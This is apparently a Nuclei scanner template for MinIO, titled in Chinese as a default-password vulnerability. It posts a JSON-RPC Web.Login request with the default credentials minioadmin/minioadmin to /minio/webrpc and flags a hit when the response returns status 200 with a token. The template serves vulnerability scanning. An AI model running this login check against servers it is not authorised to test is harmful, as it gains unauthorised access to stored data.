id: MinIO-default-login
info:
  author: Str1am
  name: "MinIO \u9ED8\u8BA4\u53E3\u4EE4\u6F0F\u6D1E"
  severity: high
  tags: MinIO,login
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - uiVersion
    - token
  matchers-condition: and
  raw:
  - 'POST /minio/webrpc HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    {"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"Web.Login"}

    '
